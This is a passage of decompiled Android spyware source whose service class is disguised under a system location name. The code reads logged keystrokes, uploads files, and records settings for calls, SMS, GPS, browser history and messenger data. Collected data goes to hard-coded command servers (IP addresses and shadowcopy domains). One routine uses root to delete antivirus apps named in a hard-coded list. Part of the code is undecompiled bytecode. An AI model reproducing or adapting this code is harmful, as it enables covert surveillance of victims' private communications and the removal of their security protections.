    catch (Exception paramOutputStream)
    {
      EXCEPT(paramOutputStream, "ReadEmailAttaches");
    }
  }
  
  private int ReadFileUpload(OutputStream paramOutputStream)
  {
    FLOG("ReadFileUpload()");
    if (this.sFileToUpload.length() == 0) {
      return 0;
    }
    String str = this.sFileToUpload;
    FLOG("trying to take file " + this.sFileToUpload);
    File localFile = new File(this.sFileToUpload);
    if (!localFile.exists())
    {
      FLOG("file not exists: " + localFile.getAbsolutePath());
      return 0;
    }
    localFile = new File(this.sFileToUpload);
    if (!localFile.exists())
    {
      FLOG("File not exists");
      this.sFileToUpload = "";
      return 0;
    }
    if (!localFile.canRead())
    {
      FLOG("cant read file");
      this.sFileToUpload = "";
      return 0;
    }
    try
    {
      this.sFileToUpload = "";
      paramOutputStream.write(125);
      AddData(paramOutputStream, str);
      AddData(paramOutputStream, localFile.length());
      WriteFileToOutputStream(localFile, paramOutputStream);
      paramOutputStream.write(1);
      paramOutputStream.write(3);
      paramOutputStream.write(2);
      FLOG("Upload okay " + localFile.length());
      if ((0 != 0) && (localFile.canWrite()))
      {
        localFile.delete();
        FLOG("Delete okay");
      }
      return 1;
    }
    catch (Exception paramOutputStream)
    {
      EXCEPT(paramOutputStream, "ReadFileUpload");
    }
    return 0;
  }
  
  private void ReadKeyBoard(GZIPOutputStream paramGZIPOutputStream)
  {
    FLOG("ReadKeyBoard()");
    Uri localUri = Uri.parse("content://com.soft.keyboard.eventsbook");
    int j = 0;
    int n = 0;
    int k = 0;
    int i = n;
    for (;;)
    {
      try
      {
        Cursor localCursor = getContentResolver().query(localUri, null, null, null, null);
        m = 0;
        if (localCursor == null) {
          continue;
        }
        i = n;
        if (!localCursor.moveToFirst()) {
          continue;
        }
        i = n;
        paramGZIPOutputStream.write(95);
        j = k;
        i = j;
        m = localCursor.getInt(localCursor.getColumnIndex("_id"));
        i = j;
        String str1 = localCursor.getString(localCursor.getColumnIndex("time_start"));
        i = j;
        AddData(paramGZIPOutputStream, str1);
        i = j;
        AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("time_finish")));
        i = j;
        String str2 = localCursor.getString(localCursor.getColumnIndex("app_info"));
        i = j;
        AddData(paramGZIPOutputStream, str2);
        i = j;
        String str3 = localCursor.getString(localCursor.getColumnIndex("data"));
        i = j;
        AddData(paramGZIPOutputStream, str3);
        i = j;
        FLOG("[" + str1 + "][" + str2 + "][" + str3 + "]");
        k = j + 1;
        i = k;
        paramGZIPOutputStream.write(3);
        j = k;
        i = k;
        if (localCursor.moveToNext()) {
          continue;
        }
        i = k;
        paramGZIPOutputStream.write(2);
        j = k;
        k = m;
        i = j;
        if (k > 0)
        {
          i = j;
          FLOG("Deleting younger " + k);
          i = j;
          getContentResolver().delete(localUri, "_id <= ?", new String[] { k });
          i = j;
        }
      }
      catch (Exception paramGZIPOutputStream)
      {
        int m;
        EXCEPT(paramGZIPOutputStream, "ReadKeyBoard");
        continue;
      }
      FLOG("ReadKeyBoard red " + i);
      return;
      i = n;
      FLOG("0 rows");
      k = m;
    }
  }
  
  private void ReadQueries(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {}
    while ((this.lSMSQueries == null) || (this.lSMSQueries.size() <= 0)) {
      return;
    }
    for (;;)
    {
      try
      {
        paramGZIPOutputStream.write(109);
        if (this.lSMSQueries.size() <= 0)
        {
          paramGZIPOutputStream.write(2);
          return;
        }
      }
      catch (Exception paramGZIPOutputStream)
      {
        EXCEPT(paramGZIPOutputStream, "ReadQueries");
        return;
      }
      String str = (String)this.lSMSQueries.removeFirst();
      AddData(paramGZIPOutputStream, "1");
      AddData(paramGZIPOutputStream, str);
      paramGZIPOutputStream.write(3);
    }
  }
  
  private void RemoveAntiVirus()
  {
    if (!bRemoveAntivirus) {
      return;
    }
    FLOG("RemoveAntiVirus");
    String[] arrayOfString = sAntivirusList.split(",");
    commandSU("mount -o remount,rw -t yaffs2 /dev/block/mtdblk3 /system");
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j)
      {
        FLOG("RemoveAntiVirus fin");
        return;
      }
      commandSU("rm /system/app/" + arrayOfString[i].trim() + "*.apk");
      commandSU("rm /data/app/" + arrayOfString[i].trim() + "*.apk");
      i += 1;
    }
  }
  
  private String Resolve(String paramString)
  {
    FLOG("Resolving = " + paramString);
    int i;
    try
    {
      i = lookupHost(paramString);
      if (i == -1)
      {
        FLOGER("lookupHost failed() -1 " + i);
        return "";
      }
      if (((i & 0xFF) == 10) || ((i & 0xFF) == 192))
      {
        FLOGER("lookupHost failed() local" + i);
        return paramString;
      }
    }
    catch (Exception localException)
    {
      EXCEPT(localException, "lookup host failed " + paramString);
      return "";
    }
    String str = (i & 0xFF) + "." + (i >> 8 & 0xFF) + "." + (i >> 16 & 0xFF) + "." + (i >> 24 & 0xFF);
    return str;
  }
  
  private void RotateHost()
  {
    FLOG("RotateHost[" + ServerList + "]");
    if (ServerList.isEmpty())
    {
      FLOG("ServerList is empty, error");
      return;
    }
    String[] arrayOfString2 = ServerList.split(":");
    if ((arrayOfString2 != null) && (arrayOfString2.length > 0) && (arrayOfString2.length == 2))
    {
      String[] arrayOfString1 = arrayOfString2[1].split(",");
      arrayOfString2 = arrayOfString2[0].split(",");
      if (Server != "") {
        iServer_ID += 1;
      }
      int i = 0;
      label115:
      if (i < arrayOfString2.length)
      {
        iServer_ID %= arrayOfString2.length;
        Server = arrayOfString2[iServer_ID];
        FLOG("Resolving host " + Server);
        Server = Resolve(Server);
        FLOG("Resolved: " + Server);
        if (Server.length() != 0) {
          break label225;
        }
        FLOG("Host not resolved, try next");
      }
      for (;;)
      {
        i += 1;
        iServer_ID += 1;
        break label115;
        break;
        label225:
        int j = 0;
        while (j < arrayOfString1.length)
        {
          iPort_ID %= arrayOfString1.length;
          Port = arrayOfString1[iPort_ID];
          FLOG("Trying port " + Port);
          FLOG("Check connection:" + Server + ":" + Port);
          if (SMSReceiver.isGet2(Server) == 1)
          {
            FLOG("new IP detected as Main=" + Server + ":" + Port);
            SaveSettings();
            return;
          }
          FLOG("isGet[" + Server + ":" + Port + "] failed, try next");
          j += 1;
          iPort_ID += 1;
        }
      }
    }
    FLOG("Cannot split line into server and port, error");
  }
  
  public static void SaveOneIntSetting(String paramString, int paramInt)
  {
    SharedPreferences.Editor localEditor = mSettings.edit();
    if (localEditor == null)
    {
      FLOG("mSettings.edit(); failed");
      return;
    }
    localEditor.putInt(paramString, paramInt);
    localEditor.commit();
  }
  
  public static void SaveOneLongSetting(String paramString, long paramLong)
  {
    SharedPreferences.Editor localEditor = mSettings.edit();
    if (localEditor == null)
    {
      FLOG("mSettings.edit(); failed");
      return;
    }
    localEditor.putLong(paramString, paramLong);
    localEditor.commit();
  }
  
  private boolean SaveRecordOrNot(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, boolean paramBoolean1, boolean paramBoolean2)
  {
    FLOG("SRON: number=" + paramString1);
    FLOG("SRON: name=" + paramString2);
    FLOG("SRON: admin=" + paramString3);
    if (paramString1 == null) {}
    while (paramString1.length() == 0) {
      return true;
    }
    if ((!paramBoolean1) && (paramString3 != null) && (paramString3.length() > 0) && (paramString1.endsWith(paramString3)))
    {
      FLOG("DONTREC: Admin!");
      return false;
    }
    if ((paramString4 != null) && (paramString4.length() > 0) && (!DoesListApply(paramString4, paramString1)))
    {
      FLOG("DONTREC: Not in white list!");
      return false;
    }
    if ((paramString5 != null) && (paramString5.length() > 0) && (DoesListApply(paramString5, paramString1)))
    {
      FLOG("DONTREC: In black list!");
      return false;
    }
    if ((paramBoolean2) && (paramString2 != null) && (paramString2.length() > 0))
    {
      FLOG("DONTREC: Known number!");
      return false;
    }
    FLOG("SRON: ok");
    return true;
  }
  
  public static void SaveSettings()
  {
    SharedPreferences.Editor localEditor = mSettings.edit();
    if (localEditor == null)
    {
      FLOG("mSettings.edit(); failed");
      return;
    }
    localEditor.putBoolean("LOGCAT", LOGCAT);
    localEditor.putBoolean("bSkipOneRootDisable", bSkipOneRootDisable);
    localEditor.putBoolean("bInitialized", bInitialized);
    localEditor.putLong("iLastPhoneBookIDServer", iLastPhoneBookIDServer);
    localEditor.putLong("lLastCallListIDServer", lLastCallListIDServer);
    localEditor.putLong("lLastBrowserHistoryID", lLastBrowserHistoryID);
    localEditor.putLong("mLastBrowser44", mLastBrowser44);
    localEditor.putLong("iLastUploadTime", iLastUploadTime);
    localEditor.putLong("iLastIntPictureRed", iLastIntPictureRed);
    localEditor.putLong("iLastExtPictureRed", iLastExtPictureRed);
    localEditor.putLong("iLastInstagram", lLastInstagram);
    localEditor.putLong("iLastIntVideoRed", iLastIntVideoRed);
    localEditor.putLong("iLastExtVideoRed", iLastExtVideoRed);
    localEditor.putLong("iAudioCallSaved", iAudioCallSaved);
    localEditor.putLong("lLastSMSRed", lLastSMSRed);
    localEditor.putString("sLicense", sLicense);
    localEditor.putString("sSimID", sSimID);
    localEditor.putString("sAdminNumber", sAdminNumber);
    localEditor.putString("sBlockSMSList", sBlockSMSList);
    localEditor.putString("sBLockIPList", sBLockIPList);
    localEditor.putString("sAnswerList", sAnswerList);
    localEditor.putString("sCallBlockList", sCallBlockList);
    localEditor.putInt("iUploadInterval", iUploadInterval);
    localEditor.putBoolean("bUseWakeLock", bUseWakeLock);
    localEditor.putBoolean("bSMSAdmin", bSMSAdmin);
    localEditor.putBoolean("bAlreadyStarted", bAlreadyStarted);
    localEditor.putInt("iUDPPort", iUDPPort);
    localEditor.putInt("iAllLogPORT", iAllLogPORT);
    localEditor.putBoolean("bRecordCalls", bRecordCalls);
    localEditor.putBoolean("bUseRepeatControl", bUseRepeatControl);
    localEditor.putBoolean("bWork", bWork);
    localEditor.putBoolean("bRecordUnknownOnly", bRecordUnknownOnly);
    localEditor.putBoolean("bLoadPictures", bLoadPictures);
    localEditor.putBoolean("bForce3G", bForce3G);
    localEditor.putBoolean("bForceWIFI", bForceWIFI);
    localEditor.putInt("iForceGPS", iForceGPS);
    localEditor.putBoolean("bUseMacForID", bUseMacForID);
    localEditor.putBoolean("bKnockOffScreenOnly", bKnockOffScreenOnly);
    localEditor.putInt("iPickup", iPickup);
    localEditor.putInt("iOldPickup", iOldPickup);
    localEditor.putString("sRecWhiteList", sRecWhiteList);
    localEditor.putString("sRecBlackList", sRecBlackList);
    localEditor.putBoolean("bReportSimChange", bReportSimChange);
    localEditor.putBoolean("bSendLog", bSendLog);
    localEditor.putBoolean("bUseBlocking", bUseBlocking);
    localEditor.putBoolean("bRecordAdmin", bRecordAdmin);
    localEditor.putLong("iBufferSize", iBufferSize);
    localEditor.putLong("iSMSQueryInterval", iSMSQueryInterval);
    localEditor.putInt("iMaxAudioListenFile", iMaxAudioListenFile);
    localEditor.putInt("iPauseBeforeCallRecord", iPauseBeforeCallRecord);
    localEditor.putInt("iCallAnswerEvent", iCallAnswerEvent);
    localEditor.putInt("iGPSCheckInterval", iGPSCheckInterval);
    localEditor.putInt("iAudioSource", iAudioSource);
    localEditor.putInt("iAudioFormat", iAudioFormat);
    localEditor.putInt("iCallEncoder", iCallEncoder);
    localEditor.putInt("iBitRate", iBitRate);
    localEditor.putInt("iSamplingRate", iSamplingRate);
    localEditor.putBoolean("bUseLame", bUseLame);
    localEditor.putBoolean("bRemoveAntivirus", bRemoveAntivirus);
    localEditor.putString("sAntivirusList", sAntivirusList);
    localEditor.putInt("iRecAfterCall", iRecAfterCall);
    localEditor.putInt("iTransfer", iTransfer);
    localEditor.putInt("iTransferBinary", iTransferBinary);
    localEditor.putInt("iTransferBinaryUnlim", iTransferBinaryUnlim);
    localEditor.putLong("lVKCounter", lVKCounter);
    localEditor.putLong("lTGCounter", lTGCounter);
    localEditor.putLong("lOKCounter", lOKCounter);
    localEditor.putLong("lFBCounter", lFBCounter);
    localEditor.putLong("lWhatsAppCounter", lWhatsAppCounter);
    localEditor.putString("sWhatsAppPath  ", sWhatsAppPath);
    localEditor.putLong("lViberCounter", lViberCounter);
    localEditor.putLong("lAgentCount", lAgentCount);
    localEditor.putString("sSyncFolder", sSyncFolder);
    localEditor.putLong("lSyncFolderLastTime", lSyncFolderLastTime);
    localEditor.putInt("lViberAttCounter", lViberAttCounter);
    localEditor.putInt("lWAAttCounter", lWAAttCounter);
    localEditor.putLong("lTGAttCounter", lTGAttCounter);
    localEditor.putLong("lFBAttCounter", lFBAttCounter);
    localEditor.putLong("lAgentAttCounter", lAgentAttCounter);
    localEditor.putLong("lOKAttCounter", lOKAttCounter);
    localEditor.putLong("lOperaCounter", lOperaCounter);
    localEditor.putLong("lOperaMiniCounter", lOperaMiniCounter);
    localEditor.putInt("iChromeCounter", iChromeCounter);
    localEditor.putInt("iFirefoxCounter", iFirefoxCounter);
    localEditor.putInt("iGPSTimeout", iGPSTimeout);
    localEditor.putInt("iOutDBRefreshRate", iOutDBRefreshRate);
    localEditor.putBoolean("bUseAutoCallRec", bUseAutoCallRec);
    localEditor.putInt("iSMSServer_ID", iSMSServer_ID);
    localEditor.putString("SMSServerList", SMSServerList);
    localEditor.putInt("iServer_ID", iServer_ID);
    localEditor.putString("ServerList", ServerList);
    localEditor.putBoolean("bUploadGmailAttach", bUploadGmailAttach);
    localEditor.putLong("iDaysLeft", iDaysLeft);
    localEditor.commit();
  }
  
  /* Error */
  public static String SendCrashLog(int paramInt)
  {
    // Byte code:
    //   0: lconst_0
    //   1: lstore_2
    //   2: aconst_null
    //   3: astore 13
    //   5: aconst_null
    //   6: astore 6
    //   8: aconst_null
    //   9: astore 11
    //   11: aconst_null
    //   12: astore 8
    //   14: aconst_null
    //   15: astore 12
    //   17: aload 6
    //   19: astore 10
    //   21: lload_2
    //   22: lstore 4
    //   24: aload 13
    //   26: astore 7
    //   28: aload 8
    //   30: astore 9
    //   32: ldc_w 2499
    //   35: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   38: aload 6
    //   40: astore 10
    //   42: lload_2
    //   43: lstore 4
    //   45: aload 13
    //   47: astore 7
    //   49: aload 8
    //   51: astore 9
    //   53: new 1250	java/io/File
    //   56: dup
    //   57: new 864	java/lang/StringBuilder
    //   60: dup
    //   61: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   64: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   67: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   70: ldc_w 1717
    //   73: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   76: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   79: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   82: ldc_w 2501
    //   85: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   88: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   91: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   94: astore 14
    //   96: aload 14
    //   98: ifnull +26 -> 124
    //   101: aload 6
    //   103: astore 10
    //   105: lload_2
    //   106: lstore 4
    //   108: aload 13
    //   110: astore 7
    //   112: aload 8
    //   114: astore 9
    //   116: aload 14
    //   118: invokevirtual 1257	java/io/File:exists	()Z
    //   121: ifeq +26 -> 147
    //   124: aload 6
    //   126: astore 10
    //   128: lload_2
    //   129: lstore 4
    //   131: aload 13
    //   133: astore 7
    //   135: aload 8
    //   137: astore 9
    //   139: aload 14
    //   141: invokevirtual 1265	java/io/File:canRead	()Z
    //   144: ifne +52 -> 196
    //   147: aload 6
    //   149: astore 10
    //   151: lload_2
    //   152: lstore 4
    //   154: aload 13
    //   156: astore 7
    //   158: aload 8
    //   160: astore 9
    //   162: ldc_w 2503
    //   165: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   168: iconst_0
    //   169: ifeq +11 -> 180
    //   172: new 1700	java/lang/NullPointerException
    //   175: dup
    //   176: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   179: athrow
    //   180: iconst_0
    //   181: ifeq +11 -> 192
    //   184: new 1700	java/lang/NullPointerException
    //   187: dup
    //   188: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   191: athrow
    //   192: ldc_w 2505
    //   195: areturn
    //   196: aload 6
    //   198: astore 10
    //   200: lload_2
    //   201: lstore 4
    //   203: aload 13
    //   205: astore 7
    //   207: aload 8
    //   209: astore 9
    //   211: aload 14
    //   213: invokevirtual 1277	java/io/File:length	()J
    //   216: lstore_2
    //   217: aload 6
    //   219: astore 10
    //   221: lload_2
    //   222: lstore 4
    //   224: aload 13
    //   226: astore 7
    //   228: aload 8
    //   230: astore 9
    //   232: new 864	java/lang/StringBuilder
    //   235: dup
    //   236: ldc_w 2507
    //   239: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   242: lload_2
    //   243: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   246: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   249: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   252: aload 6
    //   254: astore 10
    //   256: lload_2
    //   257: lstore 4
    //   259: aload 13
    //   261: astore 7
    //   263: aload 8
    //   265: astore 9
    //   267: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   270: new 864	java/lang/StringBuilder
    //   273: dup
    //   274: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   277: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   280: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   283: ldc_w 2501
    //   286: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   289: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   292: invokevirtual 2508	android/content/Context:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   295: astore 6
    //   297: aload 12
    //   299: astore 7
    //   301: aload 6
    //   303: ifnull +124 -> 427
    //   306: aload 6
    //   308: astore 10
    //   310: lload_2
    //   311: lstore 4
    //   313: aload 6
    //   315: astore 7
    //   317: aload 8
    //   319: astore 9
    //   321: aload 6
    //   323: invokevirtual 2509	java/io/FileInputStream:getFD	()Ljava/io/FileDescriptor;
    //   326: astore 13
    //   328: aload 12
    //   330: astore 7
    //   332: aload 13
    //   334: ifnull +93 -> 427
    //   337: aload 6
    //   339: astore 10
    //   341: lload_2
    //   342: lstore 4
    //   344: aload 6
    //   346: astore 7
    //   348: aload 8
    //   350: astore 9
    //   352: new 2511	java/io/FileReader
    //   355: dup
    //   356: aload 13
    //   358: invokespecial 2512	java/io/FileReader:<init>	(Ljava/io/FileDescriptor;)V
    //   361: astore 8
    //   363: aload 8
    //   365: ifnull +325 -> 690
    //   368: new 2007	java/io/BufferedReader
    //   371: dup
    //   372: aload 8
    //   374: sipush 1024
    //   377: invokespecial 2515	java/io/BufferedReader:<init>	(Ljava/io/Reader;I)V
    //   380: astore 9
    //   382: iconst_0
    //   383: istore_1
    //   384: aload 9
    //   386: ifnull +304 -> 690
    //   389: lload_2
    //   390: iload_0
    //   391: i2l
    //   392: lcmp
    //   393: ifle +13 -> 406
    //   396: aload 9
    //   398: lload_2
    //   399: iload_0
    //   400: i2l
    //   401: lsub
    //   402: invokevirtual 2519	java/io/BufferedReader:skip	(J)J
    //   405: pop2
    //   406: aload 9
    //   408: invokevirtual 2018	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   411: astore 7
    //   413: aload 7
    //   415: ifnonnull +67 -> 482
    //   418: aload 9
    //   420: invokevirtual 2520	java/io/BufferedReader:close	()V
    //   423: aload 8
    //   425: astore 7
    //   427: aload 6
    //   429: ifnull +8 -> 437
    //   432: aload 6
    //   434: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   437: lload_2
    //   438: lstore 4
    //   440: aload 7
    //   442: ifnull +11 -> 453
    //   445: aload 7
    //   447: invokevirtual 2521	java/io/FileReader:close	()V
    //   450: lload_2
    //   451: lstore 4
    //   453: new 864	java/lang/StringBuilder
    //   456: dup
    //   457: ldc_w 2523
    //   460: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   463: iload_0
    //   464: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   467: ldc_w 1717
    //   470: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   473: lload 4
    //   475: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   478: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   481: areturn
    //   482: new 864	java/lang/StringBuilder
    //   485: dup
    //   486: iload_1
    //   487: invokestatic 1549	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   490: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   493: ldc_w 1725
    //   496: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   499: aload 7
    //   501: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   504: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   507: sipush 20179
    //   510: invokestatic 1665	com/android/location/PlayService:UDP	(Ljava/lang/String;I)V
    //   513: aload 9
    //   515: invokevirtual 2018	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   518: astore 7
    //   520: iload_1
    //   521: iconst_1
    //   522: iadd
    //   523: istore_1
    //   524: goto -111 -> 413
    //   527: astore 8
    //   529: lload 4
    //   531: lstore_2
    //   532: aload 11
    //   534: astore 6
    //   536: aload 10
    //   538: astore 7
    //   540: aload 6
    //   542: astore 9
    //   544: aload 8
    //   546: ldc_w 2524
    //   549: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   552: aload 10
    //   554: ifnull +8 -> 562
    //   557: aload 10
    //   559: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   562: lload_2
    //   563: lstore 4
    //   565: aload 6
    //   567: ifnull -114 -> 453
    //   570: aload 6
    //   572: invokevirtual 2521	java/io/FileReader:close	()V
    //   575: lload_2
    //   576: lstore 4
    //   578: goto -125 -> 453
    //   581: astore 6
    //   583: lload_2
    //   584: lstore 4
    //   586: goto -133 -> 453
    //   589: astore 6
    //   591: aload 7
    //   593: ifnull +8 -> 601
    //   596: aload 7
    //   598: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   601: aload 9
    //   603: ifnull +8 -> 611
    //   606: aload 9
    //   608: invokevirtual 2521	java/io/FileReader:close	()V
    //   611: aload 6
    //   613: athrow
    //   614: astore 6
    //   616: goto -436 -> 180
    //   619: astore 6
    //   621: goto -429 -> 192
    //   624: astore 7
    //   626: goto -64 -> 562
    //   629: astore 7
    //   631: goto -30 -> 601
    //   634: astore 7
    //   636: goto -25 -> 611
    //   639: astore 6
    //   641: goto -204 -> 437
    //   644: astore 6
    //   646: lload_2
    //   647: lstore 4
    //   649: goto -196 -> 453
    //   652: astore 10
    //   654: aload 6
    //   656: astore 7
    //   658: aload 8
    //   660: astore 9
    //   662: aload 10
    //   664: astore 6
    //   666: goto -75 -> 591
    //   669: astore 9
    //   671: aload 8
    //   673: astore 7
    //   675: aload 9
    //   677: astore 8
    //   679: aload 6
    //   681: astore 10
    //   683: aload 7
    //   685: astore 6
    //   687: goto -151 -> 536
    //   690: aload 8
    //   692: astore 7
    //   694: goto -267 -> 427
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	697	0	paramInt	int
    //   383	141	1	i	int
    //   1	646	2	l1	long
    //   22	626	4	l2	long
    //   6	565	6	localObject1	Object
    //   581	1	6	localIOException1	IOException
    //   589	23	6	localObject2	Object
    //   614	1	6	localIOException2	IOException
    //   619	1	6	localIOException3	IOException
    //   639	1	6	localIOException4	IOException
    //   644	11	6	localIOException5	IOException
    //   664	22	6	localObject3	Object
    //   26	571	7	localObject4	Object
    //   624	1	7	localIOException6	IOException
    //   629	1	7	localIOException7	IOException
    //   634	1	7	localIOException8	IOException
    //   656	37	7	localObject5	Object
    //   12	412	8	localFileReader	java.io.FileReader
    //   527	145	8	localException1	Exception
    //   677	14	8	localObject6	Object
    //   30	631	9	localObject7	Object
    //   669	7	9	localException2	Exception
    //   19	539	10	localObject8	Object
    //   652	11	10	localObject9	Object
    //   681	1	10	localObject10	Object
    //   9	524	11	localObject11	Object
    //   15	314	12	localObject12	Object
    //   3	354	13	localFileDescriptor	FileDescriptor
    //   94	118	14	localFile	File
    // Exception table:
    //   from	to	target	type
    //   32	38	527	java/lang/Exception
    //   53	96	527	java/lang/Exception
    //   116	124	527	java/lang/Exception
    //   139	147	527	java/lang/Exception
    //   162	168	527	java/lang/Exception
    //   211	217	527	java/lang/Exception
    //   232	252	527	java/lang/Exception
    //   267	297	527	java/lang/Exception
    //   321	328	527	java/lang/Exception
    //   352	363	527	java/lang/Exception
    //   570	575	581	java/io/IOException
    //   32	38	589	finally
    //   53	96	589	finally
    //   116	124	589	finally
    //   139	147	589	finally
    //   162	168	589	finally
    //   211	217	589	finally
    //   232	252	589	finally
    //   267	297	589	finally
    //   321	328	589	finally
    //   352	363	589	finally
    //   544	552	589	finally
    //   172	180	614	java/io/IOException
    //   184	192	619	java/io/IOException
    //   557	562	624	java/io/IOException
    //   596	601	629	java/io/IOException
    //   606	611	634	java/io/IOException
    //   432	437	639	java/io/IOException
    //   445	450	644	java/io/IOException
    //   368	382	652	finally
    //   396	406	652	finally
    //   406	413	652	finally
    //   418	423	652	finally
    //   482	520	652	finally
    //   368	382	669	java/lang/Exception
    //   396	406	669	java/lang/Exception
    //   406	413	669	java/lang/Exception
    //   418	423	669	java/lang/Exception
    //   482	520	669	java/lang/Exception
  }
  
  public static void SetDefaultHostAndPort()
  {
    Server = "";
    iServer_ID = 0;
    Port = "";
    iPort_ID = 0;
    if (iConfig == 4) {
      ServerList = "85.25.214.104:12383";
    }
    if (iConfig == 6) {
      ServerList = "85.25.185.153:12383";
    }
    if ((iConfig == 0) || (iConfig == 5)) {
      ServerList = "85.25.214.104,217.172.190.216,cave2.shadowcopy.ru,cave1.shadowcopy.ru,shadowcopy.org:12380,80,12379";
    }
    if (iConfig == 2) {
      ServerList = "195.28.15.139,195.28.15.234:12379,443,12380";
    }
    if (iConfig == 3) {
      ServerList = "77.37.208.132:12379,12380,443";
    }
    if (iConfig == 2) {
      SMSServer = "195.28.15.234";
    }
    if (iConfig == 3) {
      SMSServer = "77.37.208.132";
    }
    if (iConfig == 4) {
      SMSServer = "188.138.125.230";
    }
    if ((iConfig == 0) || (iConfig == 5)) {
      SMSServer = "188.138.125.230";
    }
    iSMSServer_ID = 0;
    if (iConfig == 2) {
      SMSServerList = "195.28.15.234";
    }
    if (iConfig == 3) {
      SMSServerList = "77.37.208.132";
    }
    if ((iConfig == 0) || (iConfig == 5)) {
      SMSServerList = "188.138.125.230,shadowcopy.ru,shadowcopy.org";
    }
    if (iConfig == 4) {
      SMSServerList = "188.138.125.230,shadowcopy.ru,shadowcopy.org";
    }
  }
  
  public static void SetDefaultSettings()
  {
    FLOG("SetDefaultSettings::");
    bInitialized = true;
    bIconHidden = false;
    bKnockOffScreenOnly = false;
    bNeedUpdateBDCounter = true;
    bNeedUpdateChromeCounter = false;
    bNeedUpdateFirefoxCounter = false;
    bNeedUpdateOperaCounter = false;
    bNeedUpdateOperaMiniCounter = false;
    bNeedUpdateWABDCounter = true;
    bUseAutoCallRec = true;
    iGPSTimeout = 300;
    iLastMMSIDServer = 0L;
    iOutDBRefreshRate = 5;
    iPreventChrome = 0;
    iPreventFirefox = 0;
    iPreventOpera = 0;
    iPreventOperaMini = 0;
    iPreventReadViberAtt = 0;
    iPreventReadWAAtt = 0;
    iPreventReadTG = 0;
    iPreventReadFB = 0;
    iPreventReadAgent = 0;
    iPreventReadOK = 0;
    iReadSMSInterval = 2;
    iSMSQueryInterval = 3000L;
    iUploadInterval = 1;
    iWifiOnOff = 0;
    lAgentCount = 0L;
    sAdminNumber = "";
    iLastPhoneBookIDServer = 0L;
    lLastCallListIDServer = 0L;
    lLastBrowserHistoryID = 0L;
    mLastBrowser44 = 0L;
    iLastUploadTime = getCurrentTime();
    sBlockSMSList = "";
    sCallBlockList = "";
    lLastSMSRed = 0L;
    iAudioCallSaved = 0L;
    iDaysLeft = 1000L;
    bSkipOneRootDisable = false;
    bUseWakeLock = false;
    bWork = true;
    bRecordAdmin = true;
    bSMSAdmin = true;
    bRecordCalls = true;
    bUseRepeatControl = false;
    bUploadGmailAttach = true;
    bSendLog = false;
    bUseBlocking = false;
    bReportSimChange = false;
    bRecordUnknownOnly = false;
    bLoadPictures = true;
    bForce3G = false;
    bForceWIFI = false;
    iForceGPS = 0;
    iPickup = 62696895;
    iOldPickup = 0;
    bUseMacForID = false;
    iUDPPort = 0;
    iAllLogPORT = 0;
    iBufferSize = 4096L;
    iMaxAudioListenFile = 524288;
    iPauseBeforeCallRecord = 0;
    iCallAnswerEvent = 0;
    iSMSQueryInterval = 3000L;
    iGPSCheckInterval = 10;
    iAudioSource = 1;
    iAudioFormat = 1;
    iCallEncoder = 1;
    bUseLame = false;
    bRemoveAntivirus = false;
    sAntivirusList = "com.cleanmaster.security,com.avast,com.drweb, com.symantec,com.comodo, com.kms.,com.wsandroid.suite, com.avira.,com.sec.android.fwupgrade, com.qihoo.security";
